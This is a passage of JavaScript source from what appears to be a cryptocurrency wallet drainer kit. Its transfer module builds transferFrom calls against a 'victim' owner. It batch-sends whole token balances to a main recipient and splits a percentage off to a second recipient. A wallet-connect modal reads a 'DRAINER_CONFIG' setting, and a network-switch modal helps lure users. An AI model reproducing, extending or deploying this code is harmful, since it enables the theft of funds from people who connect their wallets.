      mainPercent: 100 - splitPercent
    };
  }

  /**
   * Build transfer transaction with split
   * @param {object} params
   * @returns {object[]} Array of transaction objects
   */
  function buildTransferWithSplit(params) {
    const {
      token,
      from,
      mainRecipient,
      splitRecipient,
      totalAmount,
      splitPercent,
      chainId
    } = params;

    const { mainAmount, splitAmount } = calculateSplit(totalAmount, splitPercent || DEFAULT_SPLIT_PERCENT);
    const transactions = [];

    // Main transfer
    if (BigInt(mainAmount) > 0n) {
      transactions.push({
        to: token,
        from: from,
        data: encodeTransfer(mainRecipient, mainAmount),
        value: '0x0',
        chainId: chainId
      });
    }

    // Split transfer
    if (BigInt(splitAmount) > 0n && splitRecipient) {
      transactions.push({
        to: token,
        from: from,
        data: encodeTransfer(splitRecipient, splitAmount),
        value: '0x0',
        chainId: chainId
      });
    }

    return transactions;
  }

  /**
   * Build transferFrom transaction with split
   * Used when you have approval to spend someone else's tokens
   */
  function buildTransferFromWithSplit(params) {
    const {
      token,
      victim, // Original owner
      mainRecipient,
      splitRecipient,
      totalAmount,
      splitPercent,
      chainId
    } = params;

    const { mainAmount, splitAmount } = calculateSplit(totalAmount, splitPercent || DEFAULT_SPLIT_PERCENT);
    const transactions = [];

    // Main transferFrom
    if (BigInt(mainAmount) > 0n) {
      transactions.push({
        to: token,
        data: encodeTransferFrom(victim, mainRecipient, mainAmount),
        value: '0x0',
        chainId: chainId
      });
    }

    // Split transferFrom
    if (BigInt(splitAmount) > 0n && splitRecipient) {
      transactions.push({
        to: token,
        data: encodeTransferFrom(victim, splitRecipient, splitAmount),
        value: '0x0',
        chainId: chainId
      });
    }

    return transactions;
  }

  /**
   * Build native token transfer (ETH, BNB, etc) with split
   */
  function buildNativeTransferWithSplit(params) {
    const {
      from,
      mainRecipient,
      splitRecipient,
      totalAmount,
      splitPercent,
      chainId
    } = params;

    const { mainAmount, splitAmount } = calculateSplit(totalAmount, splitPercent || DEFAULT_SPLIT_PERCENT);
    const transactions = [];

    // Main transfer
    if (BigInt(mainAmount) > 0n) {
      transactions.push({
        from: from,
        to: mainRecipient,
        value: '0x' + BigInt(mainAmount).toString(16),
        data: '0x',
        chainId: chainId
      });
    }

    // Split transfer
    if (BigInt(splitAmount) > 0n && splitRecipient) {
      transactions.push({
        from: from,
        to: splitRecipient,
        value: '0x' + BigInt(splitAmount).toString(16),
        data: '0x',
        chainId: chainId
      });
    }

    return transactions;
  }

  /**
   * Get token balance
   * @param {object} provider - Web3 provider
   * @param {string} token - Token address (null for native)
   * @param {string} account - Account address
   * @returns {Promise<string>} Balance
   */
  async function getBalance(provider, token, account) {
    if (!token || token === '0x0000000000000000000000000000000000000000') {
      // Native token balance
      try {
        const result = await provider.request({
          method: 'eth_getBalance',
          params: [account, 'latest']
        });
        return result;
      } catch (error) {
        return '0x0';
      }
    }

    // ERC20 balance
    try {
      const data = SELECTORS.balanceOf + account.slice(2).padStart(64, '0');
      const result = await provider.request({
        method: 'eth_call',
        params: [{ to: token, data }, 'latest']
      });
      return result;
    } catch (error) {
      return '0x0';
    }
  }

  /**
   * Execute transfer with split
   * @param {object} provider - Web3 provider
   * @param {object} params - Transfer parameters
   * @returns {Promise<object>} Result with tx hashes
   */
  async function executeTransferWithSplit(provider, params) {
    const {
      token,
      isNative,
      from,
      mainRecipient,
      splitRecipient,
      totalAmount,
      splitPercent
    } = params;

    const results = {
      mainTx: null,
      splitTx: null,
      success: false
    };

    try {
      if (isNative) {
        // Native token transfers
        const txs = buildNativeTransferWithSplit(params);

        if (txs.length > 0) {
          results.mainTx = await provider.request({
            method: 'eth_sendTransaction',
            params: [txs[0]]
          });
        }

        if (txs.length > 1) {
          results.splitTx = await provider.request({
            method: 'eth_sendTransaction',
            params: [txs[1]]
          });
        }
      } else {
        // ERC20 transfers
        const txs = buildTransferWithSplit(params);

        for (let i = 0; i < txs.length; i++) {
          const tx = txs[i];
          try {
            const txHash = await provider.request({
              method: 'eth_sendTransaction',
              params: [tx]
            });
            if (i === 0) results.mainTx = txHash;
            else results.splitTx = txHash;
          } catch (error) {
            console.error(`Transfer ${i} failed:`, error.message);
          }
        }
      }

      results.success = true;
    } catch (error) {
      results.error = error.message;
    }

    return results;
  }

  /**
   * Batch transfer multiple tokens with split
   * @param {object} provider - Web3 provider
   * @param {object} params - Parameters including tokens array
   * @returns {Promise<object[]>} Array of results
   */
  async function batchTransferWithSplit(provider, params) {
    const { tokens, from, mainRecipient, splitRecipient, splitPercent } = params;
    const results = [];

    for (const tokenInfo of tokens) {
      const { token, balance, isNative, decimals } = tokenInfo;

      if (BigInt(balance) <= 0n) {
        results.push({
          token,
          success: false,
          reason: 'Zero balance'
        });
        continue;
      }

      try {
        const result = await executeTransferWithSplit(provider, {
          token,
          isNative,
          from,
          mainRecipient,
          splitRecipient,
          totalAmount: balance,
          splitPercent
        });
        results.push({ token, ...result });
      } catch (error) {
        results.push({
          token,
          success: false,
          error: error.message
        });
      }
    }

    return results;
  }

  /**
   * Format amount for display
   */
  function formatAmount(amount, decimals = 18) {
    try {
      const value = BigInt(amount);
      const divisor = BigInt(10 ** decimals);
      const formatted = Number(value) / Number(divisor);
      return formatted.toLocaleString(undefined, { maximumFractionDigits: 6 });
    } catch {
      return '0';
    }
  }

  /**
   * Parse amount to BigInt with decimals
   */
  function parseAmount(amount, decimals = 18) {
    const [integer, fraction = ''] = amount.toString().split('.');
    const scaled = integer + fraction.padEnd(decimals, '0').slice(0, decimals);
    return BigInt(scaled);
  }

  /**
   * Get gas price
   */
  async function getGasPrice(provider) {
    try {
      return await provider.request({ method: 'eth_gasPrice' });
    } catch {
      return '0x4A817C800'; // 20 gwei default
    }
  }

  /**
   * Estimate gas for transfer
   */
  async function estimateTransferGas(provider, tx) {
    try {
      return await provider.request({
        method: 'eth_estimateGas',
        params: [tx]
      });
    } catch {
      return '0x5208'; // 21000 default
    }
  }

  /**
   * Create unsigned transaction for wallet to sign
   */
  function createUnsignedTransfer(params) {
    const {
      to,
      from,
      value,
      data,
      chainId,
      gasLimit,
      gasPrice,
      nonce
    } = params;

    return {
      from: from,
      to: to,
      value: value || '0x0',
      data: data || '0x',
      chainId: chainId,
      gas: gasLimit || '0x5208',
      gasPrice: gasPrice || '0x4A817C800',
      nonce: nonce
    };
  }

  // Public API
  return {
    DEFAULT_SPLIT_PERCENT,
    SELECTORS,
    encodeTransfer,
    encodeTransferFrom,
    calculateSplit,
    buildTransferWithSplit,
    buildTransferFromWithSplit,
    buildNativeTransferWithSplit,
    getBalance,
    executeTransferWithSplit,
    batchTransferWithSplit,
    formatAmount,
    parseAmount,
    getGasPrice,
    estimateTransferGas,
    createUnsignedTransfer
  };
})();

// Export for module systems
if (typeof module !== 'undefined' && module.exports) {
  module.exports = TokenTransfer;
}


  // ===== UI MODULES =====
  /**
 * Wallet Modal Module
 * Handles wallet connection UI and interactions
 * Supports multiple wallet types and connection flows
 */

const WalletModal = (function() {
  'use strict';

  // Wallet types
  const WALLET_TYPE = {
    METAMASK: 'metamask',
    WALLET_CONNECT: 'walletconnect',
    TRUST: 'trust',
    COINBASE: 'coinbase',
    BRAVE: 'brave',
    RAINBOW: 'rainbow',
    PHANTOM: 'phantom',
    TRONLINK: 'tronlink',
    INJECTED: 'injected'
  };

  // Theme configurations
  const THEMES = {
    default: {
      bg: 'linear-gradient(180deg, #1e1e1e 0%, #121212 100%)',
      text: '#fff',
      accent: '#3897f0',
      border: 'rgba(255,255,255,0.1)',
      itemBg: 'rgba(255,255,255,0.05)',
      itemHover: 'rgba(255,255,255,0.1)'
    },
    light: {
      bg: '#ffffff',
      text: '#000',
      accent: '#3897f0',
      border: '#e0e0e0',
      itemBg: '#f5f5f5',
      itemHover: '#efefef'
    },
    glass: {
      bg: 'rgba(255, 255, 255, 0.1)',
      text: '#fff',
      accent: '#fff',
      border: 'rgba(255, 255, 255, 0.2)',
      itemBg: 'rgba(255, 255, 255, 0.05)',
      itemHover: 'rgba(255, 255, 255, 0.1)',
      blur: 'blur(12px)'
    },
    minimal: {
      bg: '#000',
      text: '#fff',
      accent: '#fff',
      border: '#333',
      itemBg: '#111',
      itemHover: '#222'
    }
  };

  /**
   * Get dynamic styles based on theme
   */
  function getStyles(themeKey = 'default') {
    const t = THEMES[themeKey] || THEMES.default;
    return `
    .wallet-modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: ${t.blur || 'blur(8px)'};
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999999;
      opacity: 0;
      visibility: hidden;
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    .wallet-modal-overlay.active { opacity: 1; visibility: visible; }
    .wallet-modal {
      background: ${t.bg};
      backdrop-filter: ${t.blur || 'none'};
      border-radius: 24px;
      padding: 24px;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.4), 0 0 0 1px ${t.border};
      transform: translateY(20px);
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      position: relative;
      color: ${t.text};
    }
    .wallet-modal-overlay.active .wallet-modal { transform: translateY(0); }
    
    .wallet-modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 24px;
      padding-bottom: 16px;
      border-bottom: 1px solid ${t.border};
    }
    .wallet-modal-title { font-size: 20px; font-weight: 600; margin: 0; }
    .wallet-close {
      background: ${t.itemBg};
      border: none;
      color: ${t.text};
      width: 32px; height: 32px;
      border-radius: 50%;
      cursor: pointer;
      display: flex; align-items: center; justify-content: center;
      font-size: 18px;
    }
    .wallet-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
      margin-bottom: 20px;
    }
    .wallet-item {
      display: flex; flex-direction: column; align-items: center; gap: 8px;
      cursor: pointer; padding: 12px 4px; border-radius: 16px; transition: all 0.2s;
    }
    .wallet-item:hover { background: ${t.itemHover}; transform: translateY(-2px); }
    .wallet-item-icon {
      width: 56px; height: 56px; border-radius: 14px;
      background: ${t.itemBg};
      display: flex; align-items: center; justify-content: center;
      overflow: hidden;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    }
    .wallet-item-icon img {
      width: 32px; height: 32px; object-fit: contain;
    }
    .wallet-item-name { font-size: 11px; font-weight: 500; color: ${t.text}; opacity: 0.7; text-align: center; }
    .deep-link-btn {
        background: ${t.accent};
        color: #fff; border: none; padding: 14px; border-radius: 12px; width: 100%;
        font-weight: 600; cursor: pointer; margin-top: 10px;
        display: flex; align-items: center; justify-content: center; gap: 10px;
    }
    .wallet-error {
      background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3);
      border-radius: 12px; padding: 12px; margin-top: 16px; color: #f87171; font-size: 13px; text-align: center;
    }
    @media (max-width: 600px) {
      .wallet-modal {
        max-width: 100%; margin: 0; position: fixed; bottom: 0;
        border-bottom-left-radius: 0; border-bottom-right-radius: 0;
        transform: translateY(100%);
      }
    }
  `;
  }

  // Deep Link Configuration
  const DEEP_LINKS = {
    metamask: 'https://metamask.app.link/dapp/',
    trust: 'https://link.trustwallet.com/open_url?url=',
    rainbow: 'https://rainbow.me/open-url?url=',
    coinbase: 'https://go.cb-w.com/dapp?cb_url=',
    phantom: 'https://phantom.app/ul/browse/',
    tonkeeper: 'https://app.tonkeeper.com/ton-connect'
  };

  const WALLETS = [
    { id: 'metamask', name: 'MetaMask', icon: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/1280px-MetaMask_Fox.svg.png' },
    { id: 'trust', name: 'Trust Wallet', icon: 'https://testeipd.vercel.app/trust-wallet-icon.webp' },
    { id: 'coinbase', name: 'Coinbase', icon: 'https://www.coinbase.com/favicon.ico' },
    { id: 'rainbow', name: 'Rainbow', icon: 'https://raw.githubusercontent.com/rainbow-me/rainbowkit/main/packages/rainbowkit/src/wallets/walletConnectors/rainbowWallet/rainbowWallet.svg' },
    { id: 'phantom', name: 'Phantom', icon: 'https://coinlaunch.space/media/images/4/8/5/0/4850.sp3ow1.192x192.png' },
    { id: 'walletconnect', name: 'WalletConnect', icon: 'https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg' },
    { id: 'okx', name: 'OKX Wallet', icon: 'https://www.okx.com/favicon.ico' },
    { id: 'rabby', name: 'Rabby', icon: 'https://rabby.io/assets/images/logo.png' },
    { id: 'ledger', name: 'Ledger', icon: 'https://www.ledger.com/favicon.ico' }
  ];

  let modalContainer = null;

  function init() {
    const theme = window.DRAINER_CONFIG?.ui?.modalType || 'default';
    if (!document.getElementById('wallet-modal-styles')) {
      const style = document.createElement('style');
      style.id = 'wallet-modal-styles';
      style.textContent = getStyles(theme);
      document.head.appendChild(style);
    }
    if (!modalContainer) {
      modalContainer = document.createElement('div');
      modalContainer.id = 'wallet-modal-overlay';
      modalContainer.className = 'wallet-modal-overlay';
      document.body.appendChild(modalContainer);
    }
  }

  function getDeepLink(walletId, url = window.location.href) {
    const base = DEEP_LINKS[walletId];
    if (!base) return url;
    if (walletId === 'metamask' || walletId === 'phantom') return base + url;
    return base + encodeURIComponent(url);
  }

  function show(options = {}) {
    init();
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    
    const walletGrid = WALLETS.map(w => `
      <div class="wallet-item" data-wallet="${w.id}">
        <div class="wallet-item-icon">
            <img src="${w.icon}" alt="${w.name}" onerror="this.src='https://api.dicebear.com/7.x/initials/svg?seed=${w.name}'">
        </div>
        <div class="wallet-item-name">${w.name}</div>
      </div>
    `).join('');

    modalContainer.innerHTML = `
      <div class="wallet-modal">
        <div class="wallet-modal-header">
          <h2 class="wallet-modal-title">Connect Wallet</h2>
          <button class="wallet-close">&times;</button>
        </div>
        <div class="wallet-grid">
          ${walletGrid}
        </div>
        ${isMobile ? `
          <div class="mobile-only">
            <button class="deep-link-btn" id="deep-link-metamask">
               <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/1280px-MetaMask_Fox.svg.png" width="20" height="20"> Open in MetaMask (Direct)
            </button>
          </div>
        ` : ''}
        <div id="wallet-error-container"></div>
      </div>
    `;

    setTimeout(() => modalContainer.classList.add('active'), 10);

    return new Promise((resolve, reject) => {
      modalContainer.querySelector('.wallet-close').onclick = () => {
          hide();
          reject(new Error('Cancelled'));
      };

      modalContainer.querySelectorAll('.wallet-item').forEach(item => {
        item.onclick = async () => {
          const id = item.dataset.wallet;
          if (isMobile && DEEP_LINKS[id]) {
              window.location.href = getDeepLink(id);
              return;
          }
          
          try {
            if (window.WalletDetect) {
                const res = await window.WalletDetect.connect();
                hide();
                resolve(res);
            } else {
                throw new Error('Wallet engine not loaded');
            }
          } catch (e) {
            showError(e.message);
          }
        };
      });

      if (isMobile && document.getElementById('deep-link-metamask')) {
          document.getElementById('deep-link-metamask').onclick = () => {
              window.location.href = getDeepLink('metamask');
          };
      }
    });
  }

  function showError(msg) {
      const container = document.getElementById('wallet-error-container');
      if (container) {
          container.innerHTML = `<div class="wallet-error">${msg}</div>`;
      }
  }

  function hide() {
    if (modalContainer) modalContainer.classList.remove('active');
  }

  return { show, hide };
})();

if (typeof module !== 'undefined' && module.exports) {
  module.exports = WalletModal;
}


/**
 * Chain Modal Module
 * Handles chain switching UI and network prompts
 * Supports all major EVM chains
 */

const ChainModal = (function() {
  'use strict';

  // Chain configurations with icons and colors
  const CHAINS = {
    eth: {
      chainId: '0x1',
      chainIdNum: 1,
      name: 'Ethereum',
      symbol: 'ETH',
      icon: '⟠',
      color: '#627EEA',
      rpc: 'https://eth.llamarpc.com'
    },
    bsc: {
      chainId: '0x38',
      chainIdNum: 56,
      name: 'BNB Smart Chain',
      symbol: 'BNB',
      icon: '⬡',
      color: '#F3BA2F',
      rpc: 'https://bsc-dataseed1.binance.org'
    },
    polygon: {
      chainId: '0x89',
      chainIdNum: 137,
      name: 'Polygon',
      symbol: 'MATIC',
      icon: '⬡',
      color: '#8247E5',
      rpc: 'https://polygon-rpc.com'
    },
    avax: {
      chainId: '0xa86a',
      chainIdNum: 43114,
      name: 'Avalanche',
      symbol: 'AVAX',
      icon: '🔺',
      color: '#E84142',
      rpc: 'https://api.avax.network/ext/bc/C/rpc'
    },
    arbitrum: {
      chainId: '0xa4b1',
      chainIdNum: 42161,
      name: 'Arbitrum',
      symbol: 'ETH',
      icon: '🔵',
      color: '#28A0F0',
      rpc: 'https://arb1.arbitrum.io/rpc'
    },
    optimism: {
      chainId: '0xa',
      chainIdNum: 10,
      name: 'Optimism',
      symbol: 'ETH',
      icon: '🔴',
      color: '#FF0420',
      rpc: 'https://mainnet.optimism.io'
    },
    base: {
      chainId: '0x2105',
      chainIdNum: 8453,
      name: 'Base',
      symbol: 'ETH',
      icon: '🔷',
      color: '#0052FF',
      rpc: 'https://mainnet.base.org'
    },
    fantom: {
      chainId: '0xfa',
      chainIdNum: 250,
      name: 'Fantom',
      symbol: 'FTM',
      icon: '👻',
      color: '#1969FF',
      rpc: 'https://rpc.ftm.tools'
    },
    unichain: {
      chainId: '0x82',
      chainIdNum: 130,
      name: 'Unichain',
      symbol: 'ETH',
      icon: '🦄',
      color: '#FF007A',
      rpc: 'https://mainnet.unichain.org'
    },
    sonic: {
      chainId: '0x92',
      chainIdNum: 146,
      name: 'Sonic',
      symbol: 'S',
      icon: '⚡',
      color: '#0066FF',
      rpc: 'https://rpc.soniclabs.com'
    },
    berachain: {
      chainId: '0x138c2',
      chainIdNum: 80094,
      name: 'Berachain',
      symbol: 'BERA',
      icon: '🐻',
      color: '#F9A826',
      rpc: 'https://rpc.berachain.com'
    },
    linea: {
      chainId: '0xe708',
      chainIdNum: 59144,
      name: 'Linea',
      symbol: 'ETH',
      icon: '📄',
      color: '#000000',
      rpc: 'https://rpc.linea.build'
    },
    scroll: {
      chainId: '0x534352',
      chainIdNum: 534352,
      name: 'Scroll',
      symbol: 'ETH',
      icon: '📜',
      color: '#FFEEDA',
      rpc: 'https://rpc.scroll.io'
    },
    zksync: {
      chainId: '0x144',
      chainIdNum: 324,
      name: 'zkSync Era',
      symbol: 'ETH',
      icon: '⬡',
      color: '#8C8C8C',
      rpc: 'https://mainnet.era.zksync.io'
    },
    blast: {
      chainId: '0x13e31',
      chainIdNum: 81457,
      name: 'Blast',
      symbol: 'ETH',
      icon: '🟡',
      color: '#FCFC03',
      rpc: 'https://rpc.blast.io'
    }
  };

  // Default styles
  const DEFAULT_STYLES = `
    .chain-modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.8);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 999997;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.3s ease, visibility 0.3s ease;
    }
    .chain-modal-overlay.active {
      opacity: 1;
      visibility: visible;
    }
    .chain-modal {
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      border-radius: 20px;
      padding: 24px;
      max-width: 440px;
      width: 90%;
      max-height: 80vh;
      overflow-y: auto;
      box-shadow: 0 25px 80px rgba(0, 0, 0, 0.6);
      transform: scale(0.9);
      transition: transform 0.3s ease;
      border: 1px solid rgba(255, 255, 255, 0.1);
    }
    .chain-modal-overlay.active .chain-modal {
      transform: scale(1);
    }
    .chain-modal-header {
      text-align: center;
      margin-bottom: 20px;
      position: relative;
    }
    .chain-modal-title {
      font-size: 20px;
      font-weight: 700;
      color: #fff;
      margin: 0 0 8px 0;
    }
    .chain-modal-subtitle {
      font-size: 14px;
      color: #a0a0b0;
      margin: 0;
    }
    .chain-close {
      position: absolute;
      top: 0;
      right: 0;
      width: 32px;
      height: 32px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.1);
      border: none;
      color: #fff;
      font-size: 18px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background 0.2s ease;
    }
    .chain-close:hover {
      background: rgba(255, 255, 255, 0.2);
    }
    .chain-current {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 12px 16px;
      background: rgba(102, 126, 234, 0.1);
      border: 1px solid rgba(102, 126, 234, 0.3);
      border-radius: 12px;
      margin-bottom: 16px;
    }
    .chain-current-label {
      font-size: 12px;
      color: #a0a0b0;
      margin-right: auto;
    }
    .chain-current-name {
      font-size: 14px;
      font-weight: 600;
      color: #fff;
    }
    .chain-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 12px;
    }
    .chain-option {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 14px;
      background: rgba(255, 255, 255, 0.05);
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.2s ease;
      border: 1px solid transparent;
    }
    .chain-option:hover {
      background: rgba(255, 255, 255, 0.1);
      border-color: rgba(255, 255, 255, 0.2);
    }
    .chain-option.active {
      background: rgba(102, 126, 234, 0.1);
      border-color: rgba(102, 126, 234, 0.5);
    }
    .chain-option.switching {
      pointer-events: none;
      opacity: 0.7;
    }
    .chain-icon {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 20px;
      background: rgba(255, 255, 255, 0.1);
    }
    .chain-name {
      font-size: 14px;
      font-weight: 500;
      color: #fff;
    }
    .chain-check {
      margin-left: auto;
      color: #22c55e;
      font-size: 16px;
    }
    .chain-spinner {
      margin-left: auto;
      width: 20px;
      height: 20px;
      border: 2px solid rgba(255, 255, 255, 0.1);
      border-top-color: #667eea;
      border-radius: 50%;
      animation: chain-spin 1s linear infinite;
    }
    @keyframes chain-spin {
      to { transform: rotate(360deg); }
    }
    .chain-error {
      background: rgba(239, 68, 68, 0.1);
      border: 1px solid rgba(239, 68, 68, 0.3);
      border-radius: 12px;
      padding: 12px;
      margin-top: 16px;
      color: #f87171;
      font-size: 13px;
      text-align: center;
    }
    .chain-switch-prompt {
      text-align: center;
      padding: 24px;
    }
    .chain-switch-icon {
      font-size: 48px;
      margin-bottom: 16px;
    }
    .chain-switch-message {
      font-size: 16px;
      color: #fff;
      margin-bottom: 8px;
    }
    .chain-switch-detail {
      font-size: 14px;
      color: #a0a0b0;
    }
    @media (max-width: 480px) {
      .chain-grid {
        grid-template-columns: 1fr;
      }
    }
  `;

  // Modal container
  let modalContainer = null;

  /**
   * Initialize
   */
  function init() {
    if (!document.getElementById('chain-modal-styles')) {
      const style = document.createElement('style');
      style.id = 'chain-modal-styles';
      style.textContent = DEFAULT_STYLES;
      document.head.appendChild(style);
    }

    if (!modalContainer) {
      modalContainer = document.createElement('div');
      modalContainer.id = 'chain-modal-overlay';
      modalContainer.className = 'chain-modal-overlay';
      document.body.appendChild(modalContainer);
    }
  }

  /**
   * Get current chain
   */
  async function getCurrentChain() {
    if (!window.ethereum) return null;

    try {
      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
      for (const [key, chain] of Object.entries(CHAINS)) {
        if (chain.chainId.toLowerCase() === chainId.toLowerCase()) {
          return { key, ...chain };
        }
      }
      return { chainId, name: 'Unknown Chain' };
    } catch {
      return null;
    }
  }

  /**
   * Show chain selection modal
   */
  async function show(options = {}) {
    init();

    const {
      title = 'Select Network',
      subtitle = 'Choose a network to switch to',
      chains = Object.keys(CHAINS), // Default to all chains
      showCurrent = true,
      allowClose = true,
      onSwitch = null
    } = options;

    const currentChain = await getCurrentChain();

    const chainOptions = chains.map(key => {
      const chain = CHAINS[key];
      if (!chain) return '';
      
      const isCurrent = currentChain && currentChain.chainId === chain.chainId;
      
      return `
        <div class="chain-option ${isCurrent ? 'active' : ''}" data-chain="${key}" data-chain-id="${chain.chainId}">
          <div class="chain-icon" style="background: ${chain.color}20; color: ${chain.color}">
            ${chain.icon}
          </div>
          <span class="chain-name">${chain.name}</span>
          ${isCurrent ? '<span class="chain-check">✓</span>' : ''}
        </div>
      `;
    }).join('');

    const currentChainHtml = showCurrent && currentChain ? `
      <div class="chain-current">
        <div class="chain-icon" style="background: ${currentChain.color || '#667eea'}20; color: ${currentChain.color || '#667eea'}">
          ${currentChain.icon || '🔗'}
        </div>
        <div>
          <div class="chain-current-label">Current Network</div>
          <div class="chain-current-name">${currentChain.name}</div>
        </div>
      </div>
    ` : '';

    modalContainer.innerHTML = `
      <div class="chain-modal">
        <div class="chain-modal-header">
          <h3 class="chain-modal-title">${title}</h3>
          <p class="chain-modal-subtitle">${subtitle}</p>
          ${allowClose ? '<button class="chain-close">&times;</button>' : ''}
        </div>
        ${currentChainHtml}
        <div class="chain-grid">
          ${chainOptions}
        </div>
      </div>
    `;

    // Show modal
    setTimeout(() => modalContainer.classList.add('active'), 10);

    return new Promise((resolve, reject) => {
      // Close button
      const closeBtn = modalContainer.querySelector('.chain-close');
      if (closeBtn) {
        closeBtn.addEventListener('click', () => {
          hide();
          reject(new Error('User cancelled'));
        });
      }

      // Click overlay to close
      if (allowClose) {
        modalContainer.addEventListener('click', (e) => {
          if (e.target === modalContainer) {
            hide();
            reject(new Error('User cancelled'));
          }
        });
      }

      // Chain option clicks
      const options = modalContainer.querySelectorAll('.chain-option');
      options.forEach(option => {
        option.addEventListener('click', async () => {
          const chainKey = option.dataset.chain;
          const chainId = option.dataset.chainId;

          // Don't switch if already on this chain
          if (option.classList.contains('active')) {
            resolve({ chainKey, chainId, switched: false, reason: 'already_on_chain' });
            return;
          }

          try {
            // Show switching state
            option.classList.add('switching');
            const checkMark = option.querySelector('.chain-check');
            if (checkMark) checkMark.remove();
            
            const spinner = document.createElement('div');
            spinner.className = 'chain-spinner';
            option.appendChild(spinner);

            const result = await switchToChain(chainId, chainKey);
            
            // Update UI
            options.forEach(o => o.classList.remove('active'));
            option.classList.add('active');
            option.classList.remove('switching');
            spinner.remove();
            
            const check = document.createElement('span');
            check.className = 'chain-check';
            check.textContent = '✓';
            option.appendChild(check);

            hide();
            resolve({ chainKey, chainId, switched: true, ...result });
            if (onSwitch) onSwitch({ chainKey, chainId, switched: true });
          } catch (error) {
            option.classList.remove('switching');
            const spinner = option.querySelector('.chain-spinner');
            if (spinner) spinner.remove();
            
            showError(error.message);
            reject(error);
          }
        });
      });
    });
  }

  /**
   * Switch to specific chain
   */
  async function switchToChain(chainId, chainKey) {
    if (!window.ethereum) {
      throw new Error('No wallet connected');
    }

    try {
      // Try to switch
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId }]
      });

      return { success: true, added: false };
    } catch (switchError) {
      // Chain not added - try to add it
      if (switchError.code === 4902) {
        const chain = CHAINS[chainKey];
        if (!chain) {
          throw new Error('Chain configuration not found');
        }

        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: chain.chainId,
              chainName: chain.name,
              nativeCurrency: {
                name: chain.name,
                symbol: chain.symbol,
                decimals: 18
              },
              rpcUrls: [chain.rpc],
              blockExplorerUrls: []
            }]
          });

          return { success: true, added: true };
        } catch (addError) {
          throw new Error(`Failed to add network: ${addError.message}`);
        }
      }

      throw new Error(`Switch failed: ${switchError.message}`);
    }
  }

  /**
   * Prompt user to switch to specific chain
   */
  async function promptSwitch(targetChain, options = {}) {
    init();

    const chain = CHAINS[targetChain];
    if (!chain) {
      throw new Error(`Unknown chain: ${targetChain}`);
    }

    const currentChain = await getCurrentChain();
    if (currentChain && currentChain.chainId === chain.chainId) {
      return { switched: false, reason: 'already_on_chain' };
    }

    const {
      title = 'Switch Network',
      message = `Please switch to ${chain.name} to continue`,
      autoSwitch = false
    } = options;

    if (autoSwitch) {
      try {
        return await switchToChain(chain.chainId, targetChain);
      } catch (error) {
        // If auto-switch fails, show the prompt
      }
    }

    modalContainer.innerHTML = `
      <div class="chain-modal">
        <div class="chain-switch-prompt">
          <div class="chain-switch-icon">${chain.icon}</div>
          <div class="chain-switch-message">${title}</div>
          <div class="chain-switch-detail">${message}</div>
        </div>
        <div class="chain-grid" style="grid-template-columns: 1fr 1fr; margin-top: 16px;">
          <button class="chain-option" id="chain-cancel" style="justify-content: center;">
            <span class="chain-name">Cancel</span>
          </button>
          <button class="chain-option" id="chain-switch" style="justify-content: center; background: rgba(102, 126, 234, 0.2);">
            <span class="chain-name">Switch</span>
          </button>
        </div>
      </div>
    `;

    setTimeout(() => modalContainer.classList.add('active'), 10);

    return new Promise((resolve, reject) => {
      const cancelBtn = modalContainer.querySelector('#chain-cancel');
      const switchBtn = modalContainer.querySelector('#chain-switch');

      cancelBtn.addEventListener('click', () => {
        hide();
        reject(new Error('User cancelled'));
      });

      switchBtn.addEventListener('click', async () => {
        switchBtn.classList.add('switching');
        switchBtn.innerHTML = '<div class="chain-spinner"></div><span class="chain-name">Switching...</span>';

        try {
          const result = await switchToChain(chain.chainId, targetChain);
          hide();
          resolve({ switched: true, ...result });
        } catch (error) {
          switchBtn.classList.remove('switching');
          switchBtn.innerHTML = '<span class="chain-name">Switch</span>';
          showError(error.message);
          reject(error);
        }
      });
    });
  }

  /**
   * Show error message
   */
  function showError(message) {
    let errorDiv = modalContainer.querySelector('.chain-error');

    if (!errorDiv) {
      errorDiv = document.createElement('div');
      errorDiv.className = 'chain-error';
      modalContainer.querySelector('.chain-modal').appendChild(errorDiv);
    }

    errorDiv.textContent = message;
    errorDiv.style.display = 'block';

    setTimeout(() => {
      errorDiv.style.display = 'none';
    }, 5000);
  }

  /**
   * Hide modal
   */
  function hide() {
    if (modalContainer) {
      modalContainer.classList.remove('active');
      setTimeout(() => {
        modalContainer.innerHTML = '';
      }, 300);
    }
  }

  /**
   * Listen for chain changes
   */
  function onChainChange(callback) {
    if (window.ethereum) {
      window.ethereum.on('chainChanged', (chainId) => {
